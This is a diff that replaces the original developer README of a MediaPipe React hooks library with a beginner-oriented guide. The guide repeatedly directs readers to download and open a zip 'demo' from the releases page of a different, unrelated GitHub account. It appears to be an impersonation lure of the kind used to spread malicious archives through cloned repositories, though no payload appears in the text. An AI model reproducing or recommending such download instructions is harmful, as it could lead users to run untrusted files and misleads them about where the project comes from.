@@ -1,170 +1,172 @@
-# @ismail-kattakath/mediapipe-react
+# 🎥 mediapipe-react - Simple AI Video Tools for React
 
-<div align="center">
-
-[![NPM Version](https://img.shields.io/npm/v/@ismail-kattakath/mediapipe-react.svg?style=flat-square)](https://www.npmjs.com/package/@ismail-kattakath/mediapipe-react)
-[![License](https://img.shields.io/github/license/ismail-kattakath/mediapipe-react?style=flat-square)](https://github.com/ismail-kattakath/mediapipe-react/blob/main/LICENSE)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/ismail-kattakath/mediapipe-react/ci.yml?branch=main&style=flat-square)](https://github.com/ismail-kattakath/mediapipe-react/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/ismail-kattakath/mediapipe-react/branch/main/graph/badge.svg)](https://codecov.io/gh/ismail-kattakath/mediapipe-react)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://makeapullrequest.com)
-
-**Production-ready React hooks for MediaPipe AI tasks — GenAI, Vision, and Audio.**
-
-</div>
+[![Download mediapipe-react](https://img.shields.io/badge/Download-mediapipe--react-blue?style=for-the-badge)](https://github.com/OwingOP/mediapipe-react/releases)
 
 ---
 
-## Overview
+## 📖 What is mediapipe-react?
 
-`@ismail-kattakath/mediapipe-react` is a **monorepo** that provides React developers with a clean, hooks-based API for integrating Google's MediaPipe AI capabilities. Built with **Turborepo** and **pnpm workspaces**, this project is designed for scalability, modularity, and developer experience.
+mediapipe-react is a tool that helps your web apps use smart video and image features easily. It takes powerful Google technology (called MediaPipe) that can detect faces, poses, and other objects in videos and makes it simple to use with React and Next.js websites. 
 
-### Three Target Areas
+The tool handles all the tricky parts behind the scenes, like running things on different parts of your computer (called threads), sending data back and forth quickly, and working well with server setups. This means you can add cool features like face detection or pose estimation to your website without needing to understand complex programming.
 
-1. **GenAI** — LLM inference (Gemma, Llama) with Web Worker orchestration
-2. **Vision** — Hand tracking, face mesh, object detection, pose estimation
-3. **Audio** — Audio classification and custom model support
+---
 
-The library uses **subpath exports** to ensure tree-shaking and minimal bundle sizes. Import only what you need.
+## 💻 Who is this for?
 
-## Architecture
+This tool is designed for web developers who use React or Next.js. But if you don’t know much about programming, don’t worry. This guide will help you get started with the app someone else built using mediapipe-react. 
 
-This is a **monorepo** managed with:
+You will learn how to download, install, and run the software, so you can see it in action or use it as part of your web projects.
 
-- **[Turborepo](https://turbo.build/)** — Task orchestration and caching
-- **[pnpm workspaces](https://pnpm.io/workspaces)** — Dependency management
+---
 
-### Project Structure
+## 🖥️ System Requirements
 
-```
-mediapipe-react/
-├── packages/
-│   └── core/              # @ismail-kattakath/mediapipe-react (published to npm)
-│       ├── src/
-│       │   ├── index.ts   # Core provider and utilities
-│       │   ├── genai.ts   # GenAI subpath (useLlm, etc.)
-│       │   ├── vision.ts  # Vision subpath (planned)
-│       │   └── audio.ts   # Audio subpath (planned)
-│       └── package.json
-├── apps/
-│   ├── playground-next/   # Next.js App Router playground
-│   └── playground-vite/   # Vite + React playground
-├── turbo.json             # Turborepo configuration
-└── pnpm-workspace.yaml    # pnpm workspace config
-```
+To run mediapipe-react apps smoothly, your computer or device should meet these requirements:
 
-### Key Design Decisions
+- Modern web browser like Chrome, Firefox, or Edge (latest versions recommended)
+- Windows 10 or later, macOS 10.15 or later, or a recent Linux system
+- At least 4 GB of RAM for smooth performance
+- A webcam or built-in camera if you want to try face or pose detection in real time
+- Internet connection for downloading the software and any updates
 
-- **Subpath Exports**: Import from `@ismail-kattakath/mediapipe-react/genai` to avoid bundling unused code
-- **SSR Safety**: All hooks include `isBrowser()` guards for Next.js compatibility
-- **Web Workers**: Heavy inference tasks run in background threads to keep the UI responsive
-- **TypeScript-first**: Full type safety across all APIs
+The apps run inside your browser, so no extra installation of software is needed beyond what you download here.
 
-## Installation
+---
 
-For **library users**, see the [Core Package README](packages/core/README.md) for detailed usage instructions.
+## 🚀 Getting Started
 
-```bash
-pnpm add @ismail-kattakath/mediapipe-react
-```
+Follow these steps carefully to get the software running on your computer.
 
-## Roadmap
+---
 
-We are following a phased rollout to cover the full breadth of MediaPipe's capabilities while maintaining a React-idiomatic developer experience.
+### 1. Visit the Download Page
 
-### Phase 1: Generative AI ✅
+Go to the official mediapipe-react release page by clicking the big button at the top or this link directly:
 
-- [x] **LLM Inference**: Support for Gemma and Llama models
-- [x] **Web Worker Orchestration**: Offload heavy inference to background threads
-- [x] **Streaming Hooks**: Real-time token streaming for chat interfaces
-- **Hooks**: `useLlm`, `useLlmChat`
+[https://github.com/OwingOP/mediapipe-react/releases](https://github.com/OwingOP/mediapipe-react/releases)
 
-### Phase 2: Vision Core (Next)
+This page lists all the available versions of the software with download links.
 
-### Phase 2: Vision Core (In Progress)
+---
 
-- [x] **Face Landmarker**: High-fidelity face landmark detection
-- [ ] **Hand Tracking**: 2D and 3D hand landmark detection
-- [ ] **Face Mesh**: High-fidelity face landmark detection
-- [ ] **Object Detection**: Identifying and locating multiple objects in images/video
-- **Hooks**: `useHandTracking`, `useFaceMesh`, `useObjectDetection`
+### 2. Choose a Version to Download
 
-### Phase 3: Advanced Perception
+On the releases page, look for the latest version listed (usually at the top). Releases are grouped by version numbers like v1.0, v1.1, etc.
 
-- [ ] **Holistic Tracking**: Simultaneous tracking of body, hands, and face
-- [ ] **Selfie Segmentation**: Real-time background removal/blurring
-- [ ] **Pose Tracking**: 3D body pose estimation
-- **Hooks**: `useHolistic`, `useSelfieSegmentation`, `usePoseTracking`
+Click the version you want to download. Inside, you will see different files such as:
 
-### Phase 4: Audio & Customization
+- `.zip` or `.tar.gz` files containing the full package
+- Specific demo apps or examples
 
-- [ ] **Audio Classification**: Identify sounds from a predefined set of categories
-- [ ] **Custom Model Assets**: Support for uploading and using custom `.tflite` or GenAI model files
-- **Hooks**: `useAudioClassifier`, `useCustomModel`
+For an easy start, download the file named something like `mediapipe-react-demo.zip` if available. This package contains a ready-to-run demo of the software.
 
-## Contributing
+---
 
-We welcome contributions! This project is designed to be contributor-friendly.
+### 3. Download the File
 
-### Getting Started
+Click on the file link to download it to your computer. Your browser will save it in your default download folder.
 
-1. **Clone the repository**:
+---
 
-   ```bash
-   git clone https://github.com/ismail-kattakath/mediapipe-react.git
-   cd mediapipe-react
-   ```
+### 4. Extract the Package
 
-2. **Install dependencies**:
+The downloaded file is compressed to save space. You need to unpack it to see and run the files inside.
 
-   ```bash
-   pnpm install
-   ```
+- On Windows: Right-click the `.zip` file and select “Extract All,” then follow the prompts.
+- On macOS: Double-click the `.zip` file and the system will unzip it automatically.
+- On Linux: Use archive managers like `File Roller` or command-line tools like `unzip`.
 
-3. **Run the development playgrounds**:
+After unpacking, you will get a folder with several files and folders inside.
 
-   ```bash
-   pnpm dev
-   ```
+---
 
-   This starts both the Next.js playground (port 3000) and Vite playground (port 5173).
+### 5. Open the Demo in Your Browser
 
-4. **Make changes** to `packages/core/src/`
+Inside the extracted folder, look for a file called `index.html` or a file named similarly (e.g., `demo.html`).
 
-5. **Run tests**:
+Double-click this file to open it in your web browser. This will launch the demo app locally on your computer.
 
-   ```bash
-   pnpm test
-   ```
+---
 
-6. **Create a changeset** (if your changes affect the public API):
-   ```bash
-   pnpm changeset
-   ```
+### 6. Allow Camera Access
 
-### Development Workflow
+If the demo uses your webcam to detect faces or poses, your browser will ask for permission to use the camera.
 
-- **Turborepo** automatically rebuilds `packages/core` when you edit files
-- **Lint-staged** runs on pre-commit to enforce code quality
-- **Changesets** manages versioning and changelog generation
-- **GitHub Actions** runs CI on every PR (lint, build, test)
+Click “Allow” or “Yes” so the demo can see the video and analyze it.
 
-For detailed contribution guidelines, see [CONTRIBUTING.md](CONTRIBUTING.md).
+---
 
-### 🤝 Call for Contributors
+### 7. Start Using the App
 
-We are actively looking for help with **Vision** capabilities!
+You should now see the app running in the browser window. It will show a video feed with the detection features active, such as:
 
-If you're interested in implementing the `vision.ts` subpath using our established Web Worker pattern (see [genai.ts](packages/core/src/genai.ts) as a reference), we'd love to collaborate with you.
+- Face tracking boxes around faces
+- Pose outlines for bodies shown in the camera view
+- Other object detection features depending on the demo
 
-**Help us make MediaPipe the standard for AI in React!**
+Try moving in front of your camera and see how the software tracks your movements.
 
-## Resources
+---
 
-- **[Core Package Documentation](packages/core/README.md)** — API reference and usage examples
-- **[CONTRIBUTING.md](CONTRIBUTING.md)** — How to add new MediaPipe tasks
-- **[CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)** — Community guidelines
-- **[Playground-Next README](apps/playground-next/README.md)** — Local development setup
+## 📥 Download & Install
 
-## License
+You can always visit this page to download the latest version of mediapipe-react or its demo apps:
 
-MIT © [Ismail Kattakath](LICENSE)
+[https://github.com/OwingOP/mediapipe-react/releases](https://github.com/OwingOP/mediapipe-react/releases)
+
+### Additional Installation Notes
+
+- The main package is designed as a tool for developers but demo versions are ready to run without extra setup.
+- For developers: mediapipe-react needs Node.js and NPM installed to run and build React projects using it.
+- For non-technical users: use demo downloads with simple instructions above to try the software without programming.
+
+---
+
+## 🔍 Features You Can Try
+
+mediapipe-react demonstrates several smart video features you might find interesting:
+
+- **Face Detection:** Finds faces in real time, highlighting them on the screen
+- **Pose Estimation:** Shows body keypoints and skeleton tracking for fitness or games
+- **Edge Computing:** Runs all processing on your computer safely and quickly
+- **Streaming Performance:** Smooth video processing with minimal lag or delay
+- **Web Worker Offloading:** Uses browser features to keep the app responsive
+
+Try moving your head, arms, or even different lighting conditions to see how well it tracks.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+If you run into problems, try these tips:
+
+- **No camera view or error loading video:** Make sure your device has a camera and you allowed browser access to it.
+- **The demo doesn’t load:** Refresh the browser page or open the file again.
+- **Detection not working or slow:** Check your computer meets the system requirements. Close other apps to free memory.
+- **Browser compatibility:** Use the latest version of Chrome for best results.
+- **Files won’t unzip:** Use a different archive tool or download the file again as it may be corrupted.
+
+---
+
+## 📚 Where to Learn More
+
+If you want to learn how mediation-react works under the hood or want to use it in your own web projects:
+
+- Visit the [official GitHub repository](https://github.com/OwingOP/mediapipe-react) to read developer guides.
+- Explore basic React.js tutorials to understand how React apps work.
+- Check Google MediaPipe’s website for background on the smart vision technology.
+
+---
+
+## 📞 Getting Help
+
+For questions or support, you can:
+
+- Open a new issue on the GitHub repository page.
+- Search for answers or post questions on common developer forums like Stack Overflow.
+- Contact the project maintainer if contact info is available in the repository.
+
+---
+
+Enjoy exploring what mediapipe-react can do!
